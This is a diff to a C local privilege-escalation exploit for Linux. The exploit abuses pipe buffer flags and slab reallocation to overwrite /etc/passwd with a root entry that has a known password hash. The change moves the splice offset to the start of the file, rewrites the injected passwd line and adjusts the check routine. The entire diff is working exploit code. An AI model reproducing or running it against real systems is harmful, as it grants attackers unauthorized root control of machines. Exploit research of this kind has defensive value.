@@ -103,12 +103,13 @@ int pipe_fds[PIPES_N][2];
 
 #define PIPE_BUF_FLAG_CAN_MERGE	0x10
 
-/* Write to /etc/passwd after the "root:" word at the beginning of the file */
-#define PASSWD_OFFSET	4
 int passwd_fd = 0;
 
-/* The hash generaged with `openssl passwd -1 -salt root pwn` */
-char *pwd = "$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/bash\n";
+/*
+ * This is a string for /etc/passwd without the first spliced symbol 'r'.
+ * The hash is generated with `openssl passwd -1 -salt root pwn`.
+ */
+char *pwd = "oot:$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/bash\n";
 
 int prepare_pipes(void)
 {
@@ -177,19 +178,17 @@ int check_passwd(void)
 		return EXIT_FAILURE;
 	}
 
-	assert(PASSWD_OFFSET + 1 < CHECK_BUF_SZ);
-	bytes = read(check_fd, check_buf, PASSWD_OFFSET + 1);
+	bytes = read(check_fd, check_buf, 1);
 	if (bytes < 0) {
 		perror("[-] read");
 		goto end;
 	}
-	if (bytes != PASSWD_OFFSET + 1) {
+	if (bytes != 1) {
 		printf("[-] read short\n");
 		goto end;
 	}
 
-	ret = strncmp(check_buf, "root:", PASSWD_OFFSET + 1);
-	if (ret != 0) {
+	if (check_buf[0] != 'r') {
 		printf("[+] weird /etc/passwd\n");
 		goto end;
 	}
@@ -206,7 +205,7 @@ int check_passwd(void)
 
 	ret = strncmp(check_buf, pwd, pwd_len);
 	if (ret == 0) {
-		printf("[+] /etc/passwd contains the needed data\n");
+		printf("[+] /etc/passwd contains the needed data!\n");
 		check_result = EXIT_SUCCESS;
 	} else {
 		printf("[+] /etc/passwd contains the wrong data\n");
@@ -325,7 +324,7 @@ int main(void)
 	printf("[!] allocate (objs_per_slab * 2) target objects to create and fill new target slab\n");
 	/* Reallocate the write end of the pipe as object of size (N * sizeof(struct pipe_buffer)) */
 	for (i = 0; i < PIPES_N; i++) {
-		loff_t file_offset = PASSWD_OFFSET;
+		loff_t file_offset = 0;
 
 		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * N);
 		if (ret != PAGE_SIZE * N) {
